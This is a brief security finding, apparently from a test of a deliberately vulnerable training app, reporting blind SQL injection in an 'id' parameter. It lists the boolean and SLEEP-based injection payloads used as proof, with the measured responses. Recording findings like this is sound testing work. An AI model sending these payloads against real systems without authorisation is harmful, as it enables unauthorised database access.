title: Blind SQL Injection (Boolean + Time-based) in id parameter - /vulnerabilities/sqli_blind/
proof: Boolean differential: id=1' AND 1=1# → 'User ID exists in the database.' vs id=1' AND 1=2# → 'User ID is MISSING from the database.' Time-based: id=1' AND SLEEP(3)# → 3011ms delay; id=1' AND SLEEP(3) AND 1=2# → 12ms (false prevents sleep).
